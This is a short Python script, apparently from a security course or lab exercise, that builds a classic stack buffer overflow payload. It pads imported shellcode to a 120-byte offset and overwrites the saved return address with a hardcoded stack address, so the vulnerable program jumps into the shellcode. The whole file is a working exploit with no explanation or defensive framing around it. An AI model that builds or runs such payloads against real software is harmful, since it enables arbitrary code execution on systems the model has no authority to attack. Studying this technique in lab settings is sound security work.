#!/usr/bin/env python3

import sys
from shellcode import shellcode

# buf is 112 bytes below rbp, and rbp takes 8 bytes
offset_to_return_address = 120

# Padding
padding = b"x" * (offset_to_return_address - len(shellcode))

#start address of buf
buf_adr = 0x7ffffff6d110
address = buf_adr.to_bytes(8, 'little')

payload = shellcode + padding + address

sys.stdout.buffer.write(payload)
